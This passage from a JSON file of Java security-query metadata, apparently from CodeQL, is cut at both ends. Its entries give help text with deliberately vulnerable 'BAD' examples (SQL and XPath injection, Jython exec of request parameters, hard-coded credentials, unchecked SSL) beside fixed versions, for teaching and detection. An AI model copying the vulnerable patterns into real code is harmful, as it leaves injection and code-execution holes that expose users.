    "help": "# Insecure JavaMail SSL Configuration\nJavaMail is commonly used in Java applications to send emails. There are popular third-party libraries like Apache Commons Email which are built on JavaMail and facilitate integration. Authenticated mail sessions require user credentials and mail sessions can require SSL/TLS authentication. It is a common security vulnerability that host-specific certificate data is not validated or is incorrectly validated. Failing to validate the certificate makes the SSL session susceptible to a man-in-the-middle attack.\n\nThis query checks whether the SSL certificate is validated when credentials are used and SSL is enabled in email communications.\n\nThe query has code for both plain JavaMail invocation and mailing through Apache SimpleMail to make it more comprehensive.\n\n\n## Recommendation\nValidate SSL certificate when sensitive information is sent in email communications.\n\n\n## Example\nThe following two examples show two ways of configuring secure emails through JavaMail or Apache SimpleMail. In the 'BAD' case, credentials are sent in an SSL session without certificate validation. In the 'GOOD' case, the certificate is validated.\n\n\n```java\nimport java.util.Properties;\n\nimport javax.activation.DataSource;\nimport javax.mail.Authenticator;\nimport javax.mail.Message;\nimport javax.mail.MessagingException;\nimport javax.mail.PasswordAuthentication;\nimport javax.mail.Session;\n\nimport org.apache.logging.log4j.util.PropertiesUtil;\n\nclass JavaMail {\n    public static void main(String[] args) {\n      // BAD: Don't have server certificate check\n      {\n\t\tfinal Properties properties = PropertiesUtil.getSystemProperties();\n\t\tproperties.put(\"mail.transport.protocol\", \"protocol\");\n\t\tproperties.put(\"mail.smtp.host\", \"hostname\");\n\t\tproperties.put(\"mail.smtp.socketFactory.class\", \"classname\");\n\n\t\tfinal Authenticator authenticator = buildAuthenticator(\"username\", \"password\");\n\t\tif (null != authenticator) {\n\t\t\tproperties.put(\"mail.smtp.auth\", \"true\");\n\t\t}\n\t\tfinal Session session = Session.getInstance(properties, authenticator);\n      }\n\n      // GOOD: Have server certificate check\n      {\n\t\tfinal Properties properties = PropertiesUtil.getSystemProperties();\n\t\tproperties.put(\"mail.transport.protocol\", \"protocol\");\n\t\tproperties.put(\"mail.smtp.host\", \"hostname\");\n\t\tproperties.put(\"mail.smtp.socketFactory.class\", \"classname\");\n\n\t\tfinal Authenticator authenticator = buildAuthenticator(\"username\", \"password\");\n\t\tif (null != authenticator) {\n\t\t\tproperties.put(\"mail.smtp.auth\", \"true\");\n\t\t\tproperties.put(\"mail.smtp.ssl.checkserveridentity\", \"true\");\n\t\t}\n\t\tfinal Session session = Session.getInstance(properties, authenticator);\n      }\n    }\n}\n```\n\n```java\nimport org.apache.commons.mail.DefaultAuthenticator;\nimport org.apache.commons.mail.Email;\nimport org.apache.commons.mail.EmailException;\nimport org.apache.commons.mail.SimpleEmail;\n\nclass SimpleMail {\n    public static void main(String[] args) throws EmailException {\n      // BAD: Don't have setSSLCheckServerIdentity set or set as false    \n      {\n        Email email = new SimpleEmail();\n        email.setHostName(\"hostName\");\n        email.setSmtpPort(25);\n        email.setAuthenticator(new DefaultAuthenticator(\"username\", \"password\"));\n        email.setSSLOnConnect(true);\n        \n        //email.setSSLCheckServerIdentity(false);\n        email.setFrom(\"fromAddress\");\n        email.setSubject(\"subject\");\n        email.setMsg(\"body\");\n        email.addTo(\"toAddress\");\n        email.send();\n      }\n\n      // GOOD: Have setSSLCheckServerIdentity set to true\n      {\n        Email email = new SimpleEmail();\n        email.setHostName(\"hostName\");\n        email.setSmtpPort(25);\n        email.setAuthenticator(new DefaultAuthenticator(\"username\", \"password\"));\n        email.setSSLOnConnect(true);\n\n        email.setSSLCheckServerIdentity(true);\n        email.setFrom(\"fromAddress\");\n        email.setSubject(\"subject\");\n        email.setMsg(\"body\");\n        email.addTo(\"toAddress\");\n        email.send();\n      }\n    }\n}\n```\n\n## References\n* Jakarta Mail: [SSL Notes](https://eclipse-ee4j.github.io/mail/docs/SSLNOTES.txt).\n* Apache Commons: [Email security](https://commons.apache.org/proper/commons-email/userguide.html#Security).\n* Log4j2: [Add support for specifying an SSL configuration for SmtpAppender (CVE-2020-9488)](https://issues.apache.org/jira/browse/LOG4J2-2819).\n* Common Weakness Enumeration: [CWE-297](https://cwe.mitre.org/data/definitions/297.html).\n"
  },
  "java/trust-boundary-violation": {
    "id": "java/trust-boundary-violation",
    "name": "Trust boundary violation",
    "description": "Modifying the HTTP session attributes based on data from an untrusted source may violate a trust boundary.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.8,
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-501"
    ],
    "filename": "b0205905-TrustBoundaryViolation",
    "language": "java",
    "help": "# Trust boundary violation\nA trust boundary violation occurs when a value is passed from a less trusted context to a more trusted context.\n\nFor example, a value that is generated by a less trusted source, such as a user, may be passed to a more trusted source, such as a system process. If the less trusted source is malicious, then the value may be crafted to exploit the more trusted source.\n\nTrust boundary violations are often caused by a failure to validate input. For example, if a web application accepts a cookie from a user, then the application should validate the cookie before using it. If the cookie is not validated, then the user may be able to craft a malicious cookie that exploits the application.\n\n\n## Recommendation\nTo maintain a trust boundary, validate data from less trusted sources before use.\n\n\n## Example\nIn the first (bad) example, the server accepts a parameter from the user, then uses it to set the username without validation.\n\n\n```java\npublic void doGet(HttpServletRequest request, HttpServletResponse response) {\n    String username = request.getParameter(\"username\");\n\n    // BAD: The input is written to the session without being sanitized.\n    request.getSession().setAttribute(\"username\", username);\n}\n```\nIn the second (good) example, the server validates the parameter from the user, then uses it to set the username.\n\n\n```java\npublic void doGet(HttpServletRequest request, HttpServletResponse response) {\n    String username = request.getParameter(\"username\");\n\n    if (validator.isValidInput(\"HTTP parameter\", username, \"username\", 20, false)) {\n        // GOOD: The input is sanitized before being written to the session.\n        request.getSession().setAttribute(\"username\", username);\n    }\n}\n```\n\n## References\n* Wikipedia: [Trust boundary](http://en.wikipedia.org/wiki/Trust_boundary).\n* Common Weakness Enumeration: [CWE-501](https://cwe.mitre.org/data/definitions/501.html).\n"
  },
  "java/mybatis-annotation-sql-injection": {
    "name": "SQL injection in MyBatis annotation",
    "description": "Constructing a dynamic SQL statement with input that comes from an untrusted source could allow an attacker to modify the statement's meaning or to execute arbitrary SQL commands.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/mybatis-annotation-sql-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-089"
    ],
    "filename": "973ff15a-MyBatisAnnotationSqlInjection",
    "language": "java",
    "help": "# SQL injection in MyBatis annotation\nMyBatis uses methods with the annotations `@Select`, `@Insert`, etc. to construct dynamic SQL statements. If the syntax `${param}` is used in those statements, and `param` is a parameter of the annotated method, attackers can exploit this to tamper with the SQL statements or execute arbitrary SQL commands.\n\n\n## Recommendation\nWhen writing MyBatis mapping statements, use the syntax `#{xxx}` whenever possible. If the syntax `${xxx}` must be used, any parameters included in it should be sanitized to prevent SQL injection attacks.\n\n\n## Example\nThe following sample shows a bad and a good example of MyBatis annotations usage. The `bad1` method uses `$(name)` in the `@Select` annotation to dynamically build a SQL statement, which causes a SQL injection vulnerability. The `good1` method uses `#{name}` in the `@Select` annotation to dynamically include the parameter in a SQL statement, which causes the MyBatis framework to sanitize the input provided, preventing the vulnerability.\n\n\n```java\nimport org.apache.ibatis.annotations.Select;\n\npublic interface MyBatisAnnotationSqlInjection {\n\n    @Select(\"select * from test where name = ${name}\")\n\tpublic Test bad1(String name);\n\n    @Select(\"select * from test where name = #{name}\")\n\tpublic Test good1(String name);\n}\n```\n\n## References\n* Fortify: [SQL Injection: MyBatis Mapper](https://vulncat.fortify.com/en/detail?id=desc.config.java.sql_injection_mybatis_mapper).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n"
  },
  "java/timing-attack-against-headers-value": {
    "name": "Timing attack against header value",
    "description": "Use of a non-constant-time verification routine to check the value of an HTTP header, possibly allowing a timing attack to infer the header's expected value.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/timing-attack-against-headers-value",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-208"
    ],
    "filename": "36269823-TimingAttackAgainstHeader",
    "language": "java",
    "help": "# Timing attack against header value\nA constant-time algorithm should be used for checking the value of sensitive headers. In other words, the comparison time should not depend on the content of the input. Otherwise timing information could be used to infer the header's expected, secret value.\n\n\n## Recommendation\nUse `MessageDigest.isEqual()` method to check the value of headers. If this method is used, then the calculation time depends only on the length of input byte arrays, and does not depend on the contents of the arrays.\n\n\n## Example\nThe following example uses `String.equals()` method for validating a csrf token. This method implements a non-constant-time algorithm. The example also demonstrates validation using a safe constant-time algorithm.\n\n\n```java\nimport javax.servlet.http.HttpServletRequest;\nimport java.nio.charset.StandardCharsets;\nimport java.security.MessageDigest;\nimport java.lang.String;\n\n\npublic class Test {\n    private boolean UnsafeComparison(HttpServletRequest request) {\n        String Key = \"secret\";\n        return Key.equals(request.getHeader(\"X-Auth-Token\"));        \n    }\n\n    private boolean safeComparison(HttpServletRequest request) {\n          String token = request.getHeader(\"X-Auth-Token\");\n          String Key = \"secret\"; \n          return MessageDigest.isEqual(Key.getBytes(StandardCharsets.UTF_8), token.getBytes(StandardCharsets.UTF_8));\n    }\n    \n}\n\n\n```\n"
  },
  "java/unreachable-exit-in-loop": {
    "name": "Loop with unreachable exit condition",
    "description": "An iteration or loop with an exit condition that cannot be reached is an indication of faulty logic and can likely lead to infinite looping.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/unreachable-exit-in-loop",
    "tags": [
      "security",
      "external/cwe/cwe-835"
    ],
    "filename": "f27bcc11-InfiniteLoop",
    "language": "java",
    "help": "# Loop with unreachable exit condition\nLoops can contain multiple exit conditions, either directly in the loop condition or as guards around `break` or `return` statements. If an exit condition cannot be satisfied, then the code is misleading at best, and the loop might not terminate.\n\n\n## Recommendation\nWhen writing a loop that is intended to terminate, make sure that all the necessary exit conditions can be satisfied and that loop termination is clear.\n\n\n## Example\nThe following example shows a potentially infinite loop, since the inner loop condition is constantly true. Of course, the loop may or may not be infinite depending on the behavior of `shouldBreak`, but if this was intended as the only exit condition the loop should be rewritten to make this clear.\n\n\n```java\nfor (int i=0; i<10; i++) {\n    for (int j=0; i<10; j++) {\n        // do stuff\n        if (shouldBreak()) break;\n    }\n}\n\n```\nTo fix the loop the condition is corrected to check the right variable.\n\n\n```java\nfor (int i=0; i<10; i++) {\n    for (int j=0; j<10; j++) {\n        // do stuff\n        if (shouldBreak()) break;\n    }\n}\n\n```\n\n## References\n* Java Language Specification: [Blocks and Statements](https://docs.oracle.com/javase/specs/jls/se11/html/jls-14.html).\n* Common Weakness Enumeration: [CWE-835](https://cwe.mitre.org/data/definitions/835.html).\n"
  },
  "java/xml/xpath-injection": {
    "name": "XPath injection",
    "description": "Building an XPath expression from user-controlled sources is vulnerable to insertion of malicious code by the user.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "java/xml/xpath-injection",
    "tags": [
      "security",
      "external/cwe/cwe-643"
    ],
    "filename": "ffde1334-XPathInjection",
    "language": "java",
    "help": "# XPath injection\nIf an XPath expression is built using string concatenation, and the components of the concatenation include user input, it makes it very easy for a user to create a malicious XPath expression.\n\n\n## Recommendation\nIf user input must be included in an XPath expression, either sanitize the data or pre-compile the query and use variable references to include the user input.\n\nXPath injection can also be prevented by using XQuery.\n\n\n## Example\nIn the first three examples, the code accepts a name and password specified by the user, and uses this unvalidated and unsanitized value in an XPath expression. This is vulnerable to the user providing special characters or string sequences that change the meaning of the XPath expression to search for different values.\n\nIn the fourth example, the code uses `setXPathVariableResolver` which prevents XPath injection.\n\nThe final two examples are for dom4j. They show an example of XPath injection and one method of preventing it.\n\n\n```java\nfinal String xmlStr = \"<users>\" + \n                        \"   <user name=\\\"aaa\\\" pass=\\\"pass1\\\"></user>\" + \n                        \"   <user name=\\\"bbb\\\" pass=\\\"pass2\\\"></user>\" + \n                        \"</users>\";\ntry {\n    DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();\n    domFactory.setNamespaceAware(true);\n    DocumentBuilder builder = domFactory.newDocumentBuilder();\n    //Document doc = builder.parse(\"user.xml\");\n    Document doc = builder.parse(new InputSource(new StringReader(xmlStr)));\n\n    XPathFactory factory = XPathFactory.newInstance();\n    XPath xpath = factory.newXPath();\n\n    // Injectable data\n    String user = request.getParameter(\"user\");\n    String pass = request.getParameter(\"pass\");\n    if (user != null && pass != null) {\n        boolean isExist = false;\n\n        // Bad expression\n        String expression1 = \"/users/user[@name='\" + user + \"' and @pass='\" + pass + \"']\";\n        isExist = (boolean)xpath.evaluate(expression1, doc, XPathConstants.BOOLEAN);\n        System.out.println(isExist);\n\n        // Bad expression\n        XPathExpression expression2 = xpath.compile(\"/users/user[@name='\" + user + \"' and @pass='\" + pass + \"']\");\n        isExist = (boolean)expression2.evaluate(doc, XPathConstants.BOOLEAN);\n        System.out.println(isExist);\n\n        // Bad expression\n        StringBuffer sb = new StringBuffer(\"/users/user[@name=\");\n        sb.append(user);\n        sb.append(\"' and @pass='\");\n        sb.append(pass);\n        sb.append(\"']\");\n        String query = sb.toString();\n        XPathExpression expression3 = xpath.compile(query);\n        isExist = (boolean)expression3.evaluate(doc, XPathConstants.BOOLEAN);\n        System.out.println(isExist);\n\n        // Good expression\n        String expression4 = \"/users/user[@name=$user and @pass=$pass]\";\n        xpath.setXPathVariableResolver(v -> {\n        switch (v.getLocalPart()) {\n            case \"user\":\n                return user;\n            case \"pass\":\n                return pass;\n            default:\n                throw new IllegalArgumentException();\n            }\n        });\n        isExist = (boolean)xpath.evaluate(expression4, doc, XPathConstants.BOOLEAN);\n        System.out.println(isExist);\n\n\n        // Bad Dom4j \n        org.dom4j.io.SAXReader reader = new org.dom4j.io.SAXReader();\n        org.dom4j.Document document = reader.read(new InputSource(new StringReader(xmlStr)));\n        isExist = document.selectSingleNode(\"/users/user[@name='\" + user + \"' and @pass='\" + pass + \"']\") != null;\n        // or document.selectNodes\n        System.out.println(isExist);\n\n        // Good Dom4j\n        org.jaxen.SimpleVariableContext svc = new org.jaxen.SimpleVariableContext();\n        svc.setVariableValue(\"user\", user);\n        svc.setVariableValue(\"pass\", pass);\n        String xpathString = \"/users/user[@name=$user and @pass=$pass]\";\n        org.dom4j.XPath safeXPath = document.createXPath(xpathString);\n        safeXPath.setVariableContext(svc);\n        isExist = safeXPath.selectSingleNode(document) != null;\n        System.out.println(isExist);\n    }\n} catch (ParserConfigurationException e) {\n\n} catch (SAXException e) {\n\n} catch (XPathExpressionException e) {\n\n} catch (org.dom4j.DocumentException e) {\n\n}\n```\n\n## References\n* OWASP: [Testing for XPath Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection).\n* OWASP: [XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection).\n* Common Weakness Enumeration: [CWE-643](https://cwe.mitre.org/data/definitions/643.html).\n"
  },
  "java/tainted-arithmetic": {
    "name": "User-controlled data in arithmetic expression",
    "description": "Arithmetic operations on user-controlled data that is not validated can cause overflows.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 8.6,
    "precision": "medium",
    "id": "java/tainted-arithmetic",
    "tags": [
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-191"
    ],
    "filename": "47e93059-ArithmeticTainted",
    "language": "java",
    "help": "# User-controlled data in arithmetic expression\nPerforming calculations on user-controlled data can result in integer overflows unless the input is validated.\n\nIf the user is free to enter very large numbers, even arithmetic operations that would usually result in a small change in magnitude may result in overflows.\n\n\n## Recommendation\nAlways guard against overflow in arithmetic operations on user-controlled data by doing one of the following:\n\n* Validate the user input.\n* Define a guard on the arithmetic expression, so that the operation is performed only if the result can be known to be less than, or equal to, the maximum value for the type, for example `MAX_VALUE`.\n* Use a wider type, so that larger input values do not cause overflow.\n\n## Example\nIn this example, a value is read from standard input into an `int`. Because the value is a user-controlled value, it could be extremely large. Performing arithmetic operations on this value could therefore cause an overflow. To avoid this happening, the example shows how to perform a check before performing a multiplication.\n\n\n```java\nclass Test {\n\tpublic static void main(String[] args) {\n\t\t{\n\t\t\tint data;\n\n\t\t\tBufferedReader readerBuffered = new BufferedReader(\n\t\t\t\t\tnew InputStreamReader(System.in, \"UTF-8\"));\n\t\t\tString stringNumber = readerBuffered.readLine();\n\t\t\tif (stringNumber != null) {\n\t\t\t\tdata = Integer.parseInt(stringNumber.trim());\n\t\t\t} else {\n\t\t\t\tdata = 0;\n\t\t\t}\n\n\t\t\t// BAD: may overflow if input data is very large, for example\n\t\t\t// 'Integer.MAX_VALUE'\n\t\t\tint scaled = data * 10;\n\n\t\t\t//...\n\t\t\t\n\t\t\t// GOOD: use a guard to ensure no overflows occur\n\t\t\tint scaled2;\n\t\t\tif (data < Integer.MAX_VALUE / 10)\n\t\t\t\tscaled2 = data * 10;\n\t\t\telse\n\t\t\t\tscaled2 = Integer.MAX_VALUE;\n\t\t}\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [NUM00-J. Detect or prevent integer overflow](https://wiki.sei.cmu.edu/confluence/display/java/NUM00-J.+Detect+or+prevent+integer+overflow).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-191](https://cwe.mitre.org/data/definitions/191.html).\n"
  },
  "java/rsa-without-oaep": {
    "name": "Use of RSA algorithm without OAEP",
    "description": "Using RSA encryption without OAEP padding can result in a padding oracle attack, leading to a weaker encryption.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/rsa-without-oaep",
    "tags": [
      "security",
      "external/cwe/cwe-780"
    ],
    "filename": "3e650a50-RsaWithoutOaep",
    "language": "java",
    "help": "# Use of RSA algorithm without OAEP\nCryptographic algorithms often use padding schemes to make the plaintext less predictable. The OAEP (Optimal Asymmetric Encryption Padding) scheme should be used with RSA encryption. Using an outdated padding scheme such as PKCS1, or no padding at all, can weaken the encryption by making it vulnerable to a padding oracle attack.\n\n\n## Recommendation\nUse the OAEP scheme when using RSA encryption.\n\n\n## Example\nIn the following example, the BAD case shows no padding being used, whereas the GOOD case shows an OAEP scheme being used.\n\n\n```java\n// BAD: No padding scheme is used\nCipher rsa = Cipher.getInstance(\"RSA/ECB/NoPadding\");\n...\n\n//GOOD: OAEP padding is used\nCipher rsa = Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-1AndMGF1Padding\");\n...\n```\n\n## References\n* [Mobile Security Testing Guide](https://github.com/MobSF/owasp-mstg/blob/master/Document/0x04g-Testing-Cryptography.md#padding-oracle-attacks-due-to-weaker-padding-or-block-operation-implementations).\n* [The Padding Oracle Attack](https://robertheaton.com/2013/07/29/padding-oracle-attack/).\n* Common Weakness Enumeration: [CWE-780](https://cwe.mitre.org/data/definitions/780.html).\n"
  },
  "java/android/implicitly-exported-component": {
    "name": "Implicitly exported Android component",
    "description": "Android components with an '<intent-filter>' and no 'android:exported' attribute are implicitly exported, which can allow for improper access to the components themselves and to their data.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.2,
    "id": "java/android/implicitly-exported-component",
    "tags": [
      "security",
      "external/cwe/cwe-926"
    ],
    "precision": "high",
    "filename": "56f29a97-ImplicitlyExportedAndroidComponent",
    "language": "java",
    "help": "# Implicitly exported Android component\nThe Android manifest file defines configuration settings for Android applications. In this file, components can be declared with intent filters which specify what the components can do and what types of intents the components can respond to. If the `android:exported` attribute is omitted from the component when an intent filter is included, then the component will be implicitly exported.\n\nAn implicitly exported component could allow for improper access to the component and its data.\n\n\n## Recommendation\nExplicitly set the `android:exported` attribute for every component or use permissions to limit access to the component.\n\n\n## Example\nIn the example below, the `android:exported` attribute is omitted when an intent filter is used.\n\n\n```xml\n<manifest ... >\n    <application ...\n        <!-- BAD: this component is implicitly exported -->\n        <activity>\n            android:name=\".Activity\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\" />\n            </intent-filter>\n        </activity>\n    </application>\n</manifest>\n\n```\nA corrected version sets the `android:exported` attribute to `false`.\n\n\n```xml\n<manifest ... >\n    <application ...\n        <!-- GOOD: this component is not exported due to 'android:exported' explicitly set to 'false'-->\n        <activity>\n            android:name=\".Activity\">\n            android:exported=\"false\"\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\" />\n            </intent-filter>\n        </activity>\n    </application>\n</manifest>\n\n```\n\n## References\n* Android Developers: [App Manifest Overview](https://developer.android.com/guide/topics/manifest/manifest-intro).\n* Android Developers: [The &lt;intent-filter&gt; element](https://developer.android.com/guide/topics/manifest/intent-filter-element).\n* Android Developers: [The android:exported attribute](https://developer.android.com/guide/topics/manifest/activity-element#exported).\n* Android Developers: [The android:permission attribute](https://developer.android.com/guide/topics/manifest/activity-element#prmsn).\n* Android Developers: [Safer component exporting](https://developer.android.com/about/versions/12/behavior-changes-12#exported).\n* Common Weakness Enumeration: [CWE-926](https://cwe.mitre.org/data/definitions/926.html).\n"
  },
  "java/jython-injection": {
    "name": "Injection in Jython",
    "description": "Evaluation of a user-controlled malicious expression in Java Python interpreter may lead to remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/jython-injection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094",
      "external/cwe/cwe-095"
    ],
    "filename": "dad3fd69-JythonInjection",
    "language": "java",
    "help": "# Injection in Jython\nPython has been the most widely used programming language in recent years, and Jython (formerly known as JPython) is a popular Java implementation of Python. It allows embedded Python scripting inside Java applications and provides an interactive interpreter that can be used to interact with Java packages or with running Java applications. If an expression is built using attacker-controlled data and then evaluated, it may allow the attacker to run arbitrary code.\n\n\n## Recommendation\nIn general, including user input in Jython expression should be avoided. If user input must be included in an expression, it should be then evaluated in a safe context that doesn't allow arbitrary code invocation.\n\n\n## Example\nThe following code could execute arbitrary code in Jython Interpreter\n\n\n```java\nimport org.python.util.PythonInterpreter;\n\npublic class JythonInjection extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/plain\");\n        String code = request.getParameter(\"code\");\n        PythonInterpreter interpreter = null;\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n\n        try {\n            interpreter = new PythonInterpreter();\n            interpreter.setOut(out);\n            interpreter.setErr(out);\n\n            // BAD: allow execution of arbitrary Python code\n            interpreter.exec(code);\n            out.flush();\n\n            response.getWriter().print(out.toString());\n        } catch(PyException ex) {\n            response.getWriter().println(ex.getMessage());\n        } finally {\n            if (interpreter != null) {\n                interpreter.close();\n            }\n            out.close();\n        }\n    }\n\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        response.setContentType(\"text/plain\");\n        String code = request.getParameter(\"code\");\n        PythonInterpreter interpreter = null;\n\n        try {\n            interpreter = new PythonInterpreter();\n            // BAD: allow execution of arbitrary Python code\n            PyObject py = interpreter.eval(code);\n\n            response.getWriter().print(py.toString());\n        } catch(PyException ex) {\n            response.getWriter().println(ex.getMessage());\n        } finally {\n            if (interpreter != null) {\n                interpreter.close();\n            }\n        }\n    }\n}\n\n```\n\n## References\n* Jython Organization: [Jython and Java Integration](https://jython.readthedocs.io/en/latest/JythonAndJavaIntegration/)\n* PortSwigger: [Python code injection](https://portswigger.net/kb/issues/00100f10_python-code-injection)\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).\n"
  },
  "java/credentials-in-properties": {
    "name": "Cleartext Credentials in Properties File",
    "description": "Finds cleartext credentials in Java properties files.",
    "kind": "problem",
    "problem.severity": "warning",
    "precision": "high",
    "id": "java/credentials-in-properties",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-555",
      "external/cwe/cwe-256",
      "external/cwe/cwe-260"
    ],
    "filename": "cfd9c624-CredentialsInPropertiesFile",
    "language": "java",
    "help": "# Cleartext Credentials in Properties File\nCredentials management issues occur when credentials are stored in plaintext in an application's properties file. Common credentials include but are not limited to LDAP, mail, database, proxy account, and so on. Storing plaintext credentials in a properties file allows anyone who can read the file access to the protected resource. Good credentials management guidelines require that credentials never be stored in plaintext.\n\n\n## Recommendation\nCredentials stored in properties files should be encrypted and recycled regularly. In a Java EE deployment scenario, utilities provided by application servers like keystores and password vaults can be used to encrypt and manage credentials.\n\n\n## Example\nIn the first example, the credentials for the LDAP and datasource properties are stored in cleartext in the properties file.\n\nIn the second example, the credentials for the LDAP and datasource properties are stored in an encrypted format.\n\n\n```none\n#***************************** LDAP Credentials *****************************************#\n \nldap.ldapHost = ldap.example.com\nldap.ldapPort = 636\nldap.loginDN = cn=Directory Manager\n\n#### BAD: LDAP credentials are stored in cleartext #### \nldap.password = mysecpass\n\n#### GOOD: LDAP credentials are stored in the encrypted format #### \nldap.password = eFRZ3Cqo5zDJWMYLiaEupw==\n\nldap.domain1 = example\nldap.domain2 = com\nldap.url= ldaps://ldap.example.com:636/dc=example,dc=com\n\n#*************************** MS SQL Database Connection **********************************# \ndatasource1.driverClassName = com.microsoft.sqlserver.jdbc.SQLServerDriver\ndatasource1.url = jdbc:sqlserver://ms.example.com\\\\exampledb:1433;\ndatasource1.username = sa\n\n#### BAD: Datasource credentials are stored in cleartext #### \ndatasource1.password = Passw0rd@123\n\n#### GOOD: Datasource credentials are stored in the encrypted format #### \ndatasource1.password = VvOgflYS1EUzJdVNDoBcnA==\n\n```\n\n## References\n* OWASP: [Password Plaintext Storage](https://owasp.org/www-community/vulnerabilities/Password_Plaintext_Storage)\n* Medium (Rajeev Shukla): [Encrypting database password in the application.properties file](https://medium.com/@mail2rajeevshukla/hiding-encrypting-database-password-in-the-application-properties-34d59fe104eb)\n* Common Weakness Enumeration: [CWE-555](https://cwe.mitre.org/data/definitions/555.html).\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n"
  },
  "java/hardcoded-password-field": {
    "name": "Hard-coded password field",
    "description": "Hard-coding a password string may compromise security.",
    "kind": "problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "low",
    "id": "java/hardcoded-password-field",
    "tags": [
      "security",
      "external/cwe/cwe-798"
    ],
    "filename": "1e2d7ec8-HardcodedPasswordField",
    "language": "java",
    "help": "# Hard-coded password field\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\n\n## Example\nThe following code example connects to a database using a hard-coded user name and password:\n\n\n```java\nprivate static final String p = \"123456\"; // hard-coded credential\n\npublic static void main(String[] args) throws SQLException {\n    String url = \"jdbc:mysql://localhost/test\";\n    String u = \"admin\"; // hard-coded credential\n\n    getConn(url, u, p);\n}\n\npublic static void getConn(String url, String v, String q) throws SQLException {\n    DriverManager.getConnection(url, v, q); // sensitive call\n}\n\n```\nInstead, the user name and password could be supplied through environment variables, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "java/android/cleartext-storage-database": {
    "name": "Cleartext storage of sensitive information using a local database on Android",
    "description": "Cleartext Storage of Sensitive Information using a local database on Android allows access for users with root privileges or unexpected exposure from chained vulnerabilities.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/android/cleartext-storage-database",
    "tags": [
      "security",
      "external/cwe/cwe-312"
    ],
    "filename": "c3bb55c3-CleartextStorageAndroidDatabase",
    "language": "java",
    "help": "# Cleartext storage of sensitive information using a local database on Android\nSQLite is a lightweight database engine commonly used in Android devices to store data. By itself, SQLite does not offer any encryption mechanism by default and stores all data in cleartext, which introduces a risk if sensitive data like credentials, authentication tokens or personal identifiable information (PII) are directly stored in a SQLite database. The information could be accessed by any process or user in rooted devices, or can be disclosed through chained vulnerabilities, like unexpected access to the private storage through exposed components.\n\n\n## Recommendation\nUse `SQLCipher` or similar libraries to add encryption capabilities to SQLite. Alternatively, encrypt sensitive data using cryptographically secure algorithms before storing it in the database.\n\n\n## Example\nIn the first example, sensitive user information is stored in cleartext.\n\nIn the second and third examples, the code encrypts sensitive information before saving it to the database.\n\n\n```java\npublic void sqliteStorageUnsafe(Context ctx, String name, String password) {\n\t// BAD - sensitive information saved in cleartext.\n\tSQLiteDatabase db = ctx.openOrCreateDatabase(\"test\", Context.MODE_PRIVATE, null);\n\tdb.execSQL(\"INSERT INTO users VALUES (?, ?)\", new String[] {name, password});\n}\n\npublic void sqliteStorageSafe(Context ctx, String name, String password) {\n\t// GOOD - sensitive information encrypted with a custom method.\n\tSQLiteDatabase db = ctx.openOrCreateDatabase(\"test\", Context.MODE_PRIVATE, null);\n\tdb.execSQL(\"INSERT INTO users VALUES (?, ?)\", new String[] {name, encrypt(password)});\n}\n\npublic void sqlCipherStorageSafe(String name, String password, String databasePassword) {\n\t// GOOD - sensitive information saved using SQLCipher.\n\tnet.sqlcipher.database.SQLiteDatabase db = \n\t\tnet.sqlcipher.database.SQLiteDatabase.openOrCreateDatabase(\"test\", databasePassword, null);\n\tdb.execSQL(\"INSERT INTO users VALUES (?, ?)\", new String[] {name, password});\n}\n\nprivate static String encrypt(String cleartext) {\n    // Use an encryption or strong hashing algorithm in the real world.\n    // The example below just returns a 